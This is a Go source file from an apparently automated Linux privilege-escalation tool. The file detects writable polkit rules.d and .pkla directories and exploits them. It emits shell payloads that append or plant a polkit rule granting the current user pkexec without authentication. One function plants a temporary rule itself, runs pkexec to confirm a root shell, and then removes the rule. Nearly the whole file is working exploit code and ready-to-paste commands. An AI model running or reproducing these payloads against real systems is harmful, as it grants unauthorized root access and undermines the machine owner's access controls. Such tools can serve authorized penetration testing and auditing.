package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// ================================================================
// POLKIT — policykit decision surfaces (round 16)
// ================================================================
//
// polkit decides WHO may run what via pkexec (org.freedesktop.policykit.exec)
// and every other action. The JavaScript rules live in /etc/polkit-1/rules.d
// (.rules, polkit ≥ 105, polkitd reloads them on change) and the legacy
// .pkla files in /etc/polkit-1/localauthority/<dir>. A rule file the current
// user can create or modify is one line away from "return polkit.Result.YES
// for me" — pkexec then hands out a root shell without authentication.
// pkexec itself is NOT required to be setuid-escalated here: PwnKit
// (CVE-2021-4034) is the version-specific case and scanPwnKit already owns
// it; this scanner watches the POLICY surface instead.

// polkitRulesDir is where polkitd loads its JavaScript rules from; files are
// processed in lexical order and the first callback that returns a decision
// other than NOT_HANDLED wins — hence the 00- prefix in the exploit payload.
const polkitRulesDir = "/etc/polkit-1/rules.d"

// polkitLocalAuthorityDirs are the legacy .pkla directories (polkit < 105
// still honors them): 50-local.d for local overrides, 90-mandatory.d for
// mandatory ones. Writable here equals the same grant.
var polkitLocalAuthorityDirs = []string{
	"/etc/polkit-1/localauthority/50-local.d",
	"/etc/polkit-1/localauthority/90-mandatory.d",
}

func scanPolkit(p *AutoPrivilege) {
	scanPolkitPaths(p, polkitRulesDir, polkitLocalAuthorityDirs)
}

// scanPolkitPaths takes the policy paths as parameters (tests inject temp
// trees; production passes the canonical constants) — the same split the
// preload/sudoers scanners use.
func scanPolkitPaths(p *AutoPrivilege, rulesDir string, laDirs []string) {
	// The JavaScript rules directory: a writable DIRECTORY lets us plant a
	// fresh rule; the per-file pass (mirroring the sudoers drop-in pass)
	// catches an existing rule file the user can nevertheless modify even
	// behind a locked directory — polkitd reloads on every change.
	if info, err := os.Lstat(rulesDir); err == nil && info.IsDir() {
		if isWritableByCurrentUser(rulesDir) {
			addFinding(p, "POLKIT", rulesDir,
				"Writable polkit rules.d — plant a rule granting this user org.freedesktop.policykit.exec (pkexec without auth)",
				RiskHigh, true)
		} else {
			scanPolkitRuleFiles(p, rulesDir)
		}
	}

	// Legacy .pkla surfaces: same grant, older format.
	for _, dir := range laDirs {
		if info, err := os.Lstat(dir); err == nil && info.IsDir() {
			if isWritableByCurrentUser(dir) {
				addFinding(p, "POLKIT", dir,
					"Writable polkit localauthority dir — .pkla with Identity=unix-user and ResultAny=yes grants pkexec without auth",
					RiskHigh, true)
			}
		}
	}
}

// scanPolkitRuleFiles inspects the individual rule files of a LOCKED
// rules.d: polkitd reloads on every write, so an existing .rules file the
// current user can modify (ACLs, freak perms — ownership may still be root)
// is exploitable. Root-owned non-writable files are the healthy state and
// stay silent.
func scanPolkitRuleFiles(p *AutoPrivilege, rulesDir string) {
	entries, err := os.ReadDir(rulesDir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".rules") {
			continue
		}
		path := filepath.Join(rulesDir, e.Name())
		if isWritableByCurrentUser(path) {
			addFinding(p, "POLKIT", path,
				"Writable polkit rule file — edit it to grant this user org.freedesktop.policykit.exec (pkexec without auth; polkitd reloads on change)",
				RiskHigh, true)
		}
	}
}

// enumeratePolkit turns POLKIT findings into vectors. A writable rules
// DIRECTORY is the AUTO vector (planting a fresh 00- rule is additive and
// removed right after the check — same reversibility bar as the sudoers
// write); a writable EXISTING rule file or a localauthority dir stays
// manual: editing other people's policy files or the legacy .pkla format
// deserves a human confirming the exact edit.
func enumeratePolkit(p *AutoPrivilege, f Finding) {
	switch {
	case strings.HasSuffix(f.Target, ".rules"):
		// an existing rule file the user can modify: editing other
		// people's policy deserves a human confirming the exact edit
		addManualVector(p, "polkit rule edit", "polkit", f.Target,
			fmt.Sprintf("# append a grant for your user, then run pkexec — polkitd reloads on save:\ncat >> %s <<'EOF'\npolkit.addRule(function(action, subject) {\n    if (action.id == \"org.freedesktop.policykit.exec\" && subject.user == \"%s\") {\n        return polkit.Result.YES;\n    }\n});\nEOF\npkexec /bin/sh -c 'id'", f.Target, currentUsername()),
			RiskHigh,
			map[string]string{"note": "editing an existing policy file: confirm the file's real owner first — polkitd may refuse user-owned files with a warning"})
	case strings.HasSuffix(f.Target, "rules.d"):
		// the writable rules DIRECTORY: additive, reversible, auto
		user := currentUsername()
		addVector(p, "polkit rule injection", "polkit", f.Target,
			fmt.Sprintf("printf '%s' > %s/00-autoprivilege-temp.rules && pkexec /bin/sh -c 'id'   # polkitd reloads on change; rule removed after the check\n",
				strings.ReplaceAll(polkitRulePayload(user), "'", "'\\''"), f.Target),
			RiskHigh,
			func() *ExploitResult {
				return exploitPolkitRule(f.Target, user, p.Opts)
			},
			map[string]string{"path": f.Target, "note": "rule file is removed after the check (best effort)"})
	default:
		// legacy localauthority dir: .pkla format, human confirms
		addManualVector(p, "polkit .pkla grant", "polkit", f.Target,
			fmt.Sprintf("printf '[Grant]\\nIdentity=unix-user:%s\\nAction=org.freedesktop.policykit.exec\\nResultAny=yes\\n' > %s/99-autoprivilege.pkla\n# then run pkexec /bin/sh -c 'id' — legacy polkit picks the .pkla up on its next reload", currentUsername(), f.Target),
			RiskHigh,
			map[string]string{"note": "legacy localauthority format (polkit < 105); modern polkitd ignores .pkla when .rules exist — verify polkitd --version"})
	}
}

// polkitRulePayload is the JavaScript grant the auto exploit plants: first
// file in lexical order (00-), first callback to return a decision wins, so
// our YES precedes any restrictive rule regardless of what else is in there.
func polkitRulePayload(user string) string {
	return fmt.Sprintf(`polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.policykit.exec" && subject.user == "%s") {
        return polkit.Result.YES;
    }
});
`, user)
}

// exploitPolkitRule plants a temporary 00- rule granting the current user
// the exec action, runs `pkexec /bin/sh -c id` to confirm uid=0, and removes
// the rule file on the way out (best effort — a crashed attempt leaves a
// 0600 root-... user-owned file behind, which the scan itself would flag).
// Additive and reversible by construction: nothing existing is edited.
func exploitPolkitRule(rulesDir, user string, opts Options) *ExploitResult {
	r := &ExploitResult{Vector: "polkit rule injection " + rulesDir}

	rulePath := filepath.Join(rulesDir, "00-autoprivilege-temp.rules")
	if err := os.WriteFile(rulePath, []byte(polkitRulePayload(user)), 0644); err != nil {
		r.Error = err.Error()
		return r
	}
	defer func() {
		_ = os.Remove(rulePath) // best-effort cleanup: polkitd reloads the removal too
	}()

	out, err := runCmdOut(opts.scanCmdTimeout(), "pkexec", "/bin/sh", "-c", "id")
	if err != nil {
		r.Error = strings.TrimSpace(string(out) + " | " + err.Error())
		return r
	}
	output := strings.TrimSpace(string(out))
	if strings.Contains(output, "uid=0") {
		r.Success = true
		r.IsRoot = true
		r.Output = "root shell via pkexec after temporary polkit rule"
		return r
	}
	r.Success = true
	r.Output = "rule planted and pkexec ran: " + output
	return r
}
